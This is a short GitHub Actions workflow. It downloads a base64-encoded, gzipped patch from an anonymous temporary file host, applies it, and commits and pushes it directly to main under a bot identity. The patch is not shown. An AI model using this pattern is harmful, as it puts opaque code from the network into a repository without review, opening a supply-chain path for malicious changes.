name: apply-patch
on:
  push:
    paths:
      - '.github/workflows/apply64.yml'
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
      - name: Apply playlist detail patch
        run: |
          curl -fsSL "https://d.uguu.se/swexSajEUTDM.b64" -o /tmp/x.b64
          base64 -d /tmp/x.b64 | gunzip > /tmp/x.patch
          git apply --unidiff-zero /tmp/x.patch
          git config user.name "SoundWave Bot"
          git config user.email "bot@users.noreply.github.com"
          git add -A
          git commit -m "feat(library): premium playlist detail page and add-songs sheet"
          git push origin HEAD:main
